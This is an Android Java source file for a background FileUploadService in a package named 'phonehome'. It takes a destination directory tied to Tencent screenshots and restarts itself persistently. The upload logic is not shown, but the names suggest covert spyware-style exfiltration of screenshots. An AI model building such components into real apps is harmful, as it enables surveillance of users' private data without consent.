package test.com.accessibility.Utilz.phonehome;

import android.app.Service;
import android.content.Intent;
import android.os.Binder;
import android.os.IBinder;
import android.util.Log;

public class FileUploadService extends Service {
    private static String LOG_TAG = "Plugin::FileUploadService";
    private IBinder mBinder = new FileUploadService.MyBinder();
    private HandlerHelper mHandler;
    private static final String ACTION_Tecent_Screenshot_dst_dir = "test.com.accessibility.extra.dst_dir";

    @Override
    public void onCreate() {
        super.onCreate();
        Log.v(LOG_TAG, "in onCreate: ");
    }

    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            if(intent.getAction() == null){
                String dst_dir = intent.getStringExtra(ACTION_Tecent_Screenshot_dst_dir);
                mHandler = new HandlerHelper(this, dst_dir);
                mHandler.startFileJob();
            } else {
                switch (intent.getAction()) {
                    case "stop":
                        this.onDestroy();
                        break;
                }
            }
        }
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        Log.v(LOG_TAG, "in onBind");
        if (intent != null) {
            String dst_dir = intent.getStringExtra(ACTION_Tecent_Screenshot_dst_dir);
            mHandler = new HandlerHelper(this, dst_dir);
            mHandler.startFileJob();
        }
        return mBinder;
    }

    @Override
    public void onRebind(Intent intent) {
        super.onRebind(intent);
    }

    @Override
    public boolean onUnbind(Intent intent) {
        return true;
    }

    @Override
    public void onDestroy() {
        mHandler.stopFileJob();
        super.onDestroy();
    }

    public class MyBinder extends Binder {
        FileUploadService getService() {
            return FileUploadService.this;
        }
    }
}

